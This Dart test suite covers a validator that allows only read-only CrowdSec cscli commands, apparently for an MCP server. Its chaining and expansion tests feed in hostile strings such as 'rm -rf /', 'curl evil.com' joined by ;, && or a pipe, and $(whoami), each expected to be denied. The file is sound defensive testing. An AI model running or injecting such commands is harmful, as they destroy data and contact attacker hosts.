import 'package:test/test.dart';
import '../../bin/mcp_server/utils/cscli_command_parser.dart';

void main() {
  group('CscliCommandParser', () {
    group('allowed read-only commands', () {
      test('decisions list is allowed', () {
        final result = CscliCommandParser.validate('decisions list');
        expect(result.isAllowed, isTrue);
        expect(result.parsedCommand?.command, 'decisions');
        expect(result.parsedCommand?.subcommand, 'list');
      });

      test('alerts list is allowed', () {
        final result = CscliCommandParser.validate('alerts list');
        expect(result.isAllowed, isTrue);
        expect(result.parsedCommand?.command, 'alerts');
        expect(result.parsedCommand?.subcommand, 'list');
      });

      test('alerts inspect is allowed', () {
        final result = CscliCommandParser.validate('alerts inspect');
        expect(result.isAllowed, isTrue);
        expect(result.parsedCommand?.command, 'alerts');
        expect(result.parsedCommand?.subcommand, 'inspect');
      });

      test('metrics is allowed (standalone)', () {
        final result = CscliCommandParser.validate('metrics');
        expect(result.isAllowed, isTrue);
        expect(result.parsedCommand?.command, 'metrics');
      });

      test('hub list is allowed', () {
        final result = CscliCommandParser.validate('hub list');
        expect(result.isAllowed, isTrue);
      });

      test('bouncers list is allowed', () {
        final result = CscliCommandParser.validate('bouncers list');
        expect(result.isAllowed, isTrue);
      });

      test('machines list is allowed', () {
        final result = CscliCommandParser.validate('machines list');
        expect(result.isAllowed, isTrue);
      });

      test('lapi status is allowed', () {
        final result = CscliCommandParser.validate('lapi status');
        expect(result.isAllowed, isTrue);
        expect(result.parsedCommand?.command, 'lapi');
        expect(result.parsedCommand?.subcommand, 'status');
      });

      test('capi status is allowed', () {
        final result = CscliCommandParser.validate('capi status');
        expect(result.isAllowed, isTrue);
      });

      test('explain is allowed (standalone)', () {
        final result = CscliCommandParser.validate('explain');
        expect(result.isAllowed, isTrue);
        expect(result.parsedCommand?.command, 'explain');
      });

      test('parsers list is allowed', () {
        final result = CscliCommandParser.validate('parsers list');
        expect(result.isAllowed, isTrue);
      });

      test('scenarios list is allowed', () {
        final result = CscliCommandParser.validate('scenarios list');
        expect(result.isAllowed, isTrue);
      });

      test('postoverflows list is allowed', () {
        final result = CscliCommandParser.validate('postoverflows list');
        expect(result.isAllowed, isTrue);
      });

      test('collections list is allowed', () {
        final result = CscliCommandParser.validate('collections list');
        expect(result.isAllowed, isTrue);
      });

      test('config show is allowed', () {
        final result = CscliCommandParser.validate('config show');
        expect(result.isAllowed, isTrue);
        expect(result.parsedCommand?.command, 'config');
        expect(result.parsedCommand?.subcommand, 'show');
      });
    });

    group('allowed commands with options', () {
      test('decisions list with --output json', () {
        final result =
            CscliCommandParser.validate('decisions list --output json');
        expect(result.isAllowed, isTrue);
      });

      test('alerts list with --since and --limit', () {
        final result = CscliCommandParser.validate(
            'alerts list --since 2024-01-01 --limit 50');
        expect(result.isAllowed, isTrue);
      });

      test('alerts inspect with -d flag', () {
        final result = CscliCommandParser.validate('alerts inspect -d 42');
        expect(result.isAllowed, isTrue);
      });

      test('decisions list with --ip', () {
        final result =
            CscliCommandParser.validate('decisions list --ip 1.2.3.4');
        expect(result.isAllowed, isTrue);
      });

      test('metrics with --output json', () {
        final result = CscliCommandParser.validate('metrics --output json');
        expect(result.isAllowed, isTrue);
      });

      test('decisions list with --no-pager', () {
        final result =
            CscliCommandParser.validate('decisions list --no-pager');
        expect(result.isAllowed, isTrue);
      });

      test('hub list with --all', () {
        final result = CscliCommandParser.validate('hub list --all');
        expect(result.isAllowed, isTrue);
      });

      test('hub list with -a', () {
        final result = CscliCommandParser.validate('hub list -a');
        expect(result.isAllowed, isTrue);
      });
    });

    group('denied destructive commands', () {
      test('decisions delete is denied', () {
        final result = CscliCommandParser.validate('decisions delete');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('not allowed'));
      });

      test('decisions add is denied', () {
        final result = CscliCommandParser.validate('decisions add');
        expect(result.isAllowed, isFalse);
      });

      test('alerts delete is denied', () {
        final result = CscliCommandParser.validate('alerts delete');
        expect(result.isAllowed, isFalse);
      });

      test('machines remove is denied', () {
        final result = CscliCommandParser.validate('machines remove');
        expect(result.isAllowed, isFalse);
      });

      test('machines add is denied', () {
        final result = CscliCommandParser.validate('machines add');
        expect(result.isAllowed, isFalse);
      });

      test('bouncers delete is denied', () {
        final result = CscliCommandParser.validate('bouncers delete');
        expect(result.isAllowed, isFalse);
      });

      test('bouncers add is denied', () {
        final result = CscliCommandParser.validate('bouncers add');
        expect(result.isAllowed, isFalse);
      });

      test('hub remove is denied', () {
        final result = CscliCommandParser.validate('hub remove');
        expect(result.isAllowed, isFalse);
      });

      test('hub upgrade is denied', () {
        final result = CscliCommandParser.validate('hub upgrade');
        expect(result.isAllowed, isFalse);
      });

      test('hub install is denied', () {
        final result = CscliCommandParser.validate('hub install');
        expect(result.isAllowed, isFalse);
      });

      test('hub update is denied', () {
        final result = CscliCommandParser.validate('hub update');
        expect(result.isAllowed, isFalse);
      });

      test('config restore is denied', () {
        final result = CscliCommandParser.validate('config restore');
        expect(result.isAllowed, isFalse);
      });

      test('config backup is denied', () {
        final result = CscliCommandParser.validate('config backup');
        expect(result.isAllowed, isFalse);
      });

      test('console enroll is denied', () {
        final result = CscliCommandParser.validate('console enroll');
        expect(result.isAllowed, isFalse);
      });

      test('console disable is denied', () {
        final result = CscliCommandParser.validate('console disable');
        expect(result.isAllowed, isFalse);
      });

      test('simulation enable is denied', () {
        final result = CscliCommandParser.validate('simulation enable');
        expect(result.isAllowed, isFalse);
      });

      test('simulation disable is denied', () {
        final result = CscliCommandParser.validate('simulation disable');
        expect(result.isAllowed, isFalse);
      });

      test('papi sync is denied (all papi commands blocked)', () {
        final result = CscliCommandParser.validate('papi sync');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('not allowed'));
      });

      test('papi status is denied (all papi commands blocked)', () {
        final result = CscliCommandParser.validate('papi status');
        expect(result.isAllowed, isFalse);
      });
    });

    group('dangerous options', () {
      test('--remediation is denied', () {
        final result =
            CscliCommandParser.validate('decisions list --remediation');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('not allowed'));
      });

      test('--purge is denied', () {
        final result = CscliCommandParser.validate('decisions list --purge');
        expect(result.isAllowed, isFalse);
      });

      test('--force is denied', () {
        final result = CscliCommandParser.validate('hub list --force');
        expect(result.isAllowed, isFalse);
      });
    });

    group('command chaining prevention', () {
      test('semicolon chaining is denied', () {
        final result =
            CscliCommandParser.validate('decisions list ; rm -rf /');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('chaining'));
      });

      test('&& chaining is denied', () {
        final result =
            CscliCommandParser.validate('decisions list && curl evil.com');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('chaining'));
      });

      test('|| chaining is denied', () {
        final result =
            CscliCommandParser.validate('alerts list || curl evil.com');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('chaining'));
      });

      test('pipe chaining is denied', () {
        final result =
            CscliCommandParser.validate('decisions list | curl evil.com');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('chaining'));
      });
    });

    group('shell expansion prevention', () {
      test('variable expansion is denied', () {
        final result =
            CscliCommandParser.validate('decisions list \$VARIABLE');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('expansion'));
      });

      test('backtick expansion is denied', () {
        final result =
            CscliCommandParser.validate('decisions list `whoami`');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('expansion'));
      });

      test('subshell expansion is denied', () {
        final result =
            CscliCommandParser.validate('decisions list \$(whoami)');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('expansion'));
      });
    });

    group('quoted strings handling', () {
      test('single quoted strings work', () {
        final result = CscliCommandParser.validate("explain 'my log line'");
        expect(result.isAllowed, isTrue);
      });

      test('double quoted strings work', () {
        final result = CscliCommandParser.validate('explain "my log line"');
        expect(result.isAllowed, isTrue);
      });
    });

    group('unknown commands denied by default', () {
      test('unknown command is denied', () {
        final result = CscliCommandParser.validate('unknown-command foo');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('not in the allowed list'));
      });

      test('unknown subcommand for known command is denied', () {
        final result = CscliCommandParser.validate('decisions unknown');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('not allowed'));
      });
    });

    group('subcommand requirements', () {
      test('command requiring subcommand without one is denied', () {
        final result = CscliCommandParser.validate('decisions');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('requires a subcommand'));
      });

      test('config without subcommand is denied', () {
        final result = CscliCommandParser.validate('config');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('requires a subcommand'));
      });

      test('hub without subcommand is denied', () {
        final result = CscliCommandParser.validate('hub');
        expect(result.isAllowed, isFalse);
        expect(result.reason, contains('requires a subcommand'));
      });
    });

    group('case insensitivity', () {
      test('commands are case-insensitive', () {
        final result1 = CscliCommandParser.validate('DECISIONS LIST');
        final result2 = CscliCommandParser.validate('Decisions List');
        expect(result1.isAllowed, isTrue);
        expect(result2.isAllowed, isTrue);
      });

      test('subcommands are case-insensitive', () {
        final result = CscliCommandParser.validate('alerts INSPECT');
        expect(result.isAllowed, isTrue);
      });
    });

    group('edge cases', () {
      test('empty input is denied', () {
        final result = CscliCommandParser.validate('');
        expect(result.isAllowed, isFalse);
      });

      test('whitespace only is denied', () {
        final result = CscliCommandParser.validate('   ');
        expect(result.isAllowed, isFalse);
      });

      test('no command specified is denied', () {
        final result = CscliCommandParser.validate('--output json');
        expect(result.isAllowed, isFalse);
      });

    });

    group('isAllowed convenience method', () {
      test('returns true for allowed commands', () {
        expect(CscliCommandParser.isAllowed('decisions list'), isTrue);
      });

      test('returns false for denied commands', () {
        expect(CscliCommandParser.isAllowed('decisions delete'), isFalse);
      });
    });

    group('buildCommand method', () {
      test('builds valid command with subcommand', () {
        final cmd = CscliCommandParser.buildCommand(
          command: 'decisions',
          subcommand: 'list',
          options: ['--output', 'json'],
        );
        expect(cmd, 'decisions list --output json');
      });

      test('builds valid standalone command', () {
        final cmd = CscliCommandParser.buildCommand(
          command: 'metrics',
        );
        expect(cmd, 'metrics');
      });

      test('returns null for denied command', () {
        final cmd = CscliCommandParser.buildCommand(
          command: 'papi',
          subcommand: 'sync',
        );
        expect(cmd, isNull);
      });

      test('returns null for denied subcommand', () {
        final cmd = CscliCommandParser.buildCommand(
          command: 'decisions',
          subcommand: 'delete',
        );
        expect(cmd, isNull);
      });

      test('returns null for null command', () {
        final cmd = CscliCommandParser.buildCommand(command: null);
        expect(cmd, isNull);
      });

      test('returns null when subcommand required but missing', () {
        final cmd = CscliCommandParser.buildCommand(
          command: 'decisions',
        );
        expect(cmd, isNull);
      });
    });
  });
}
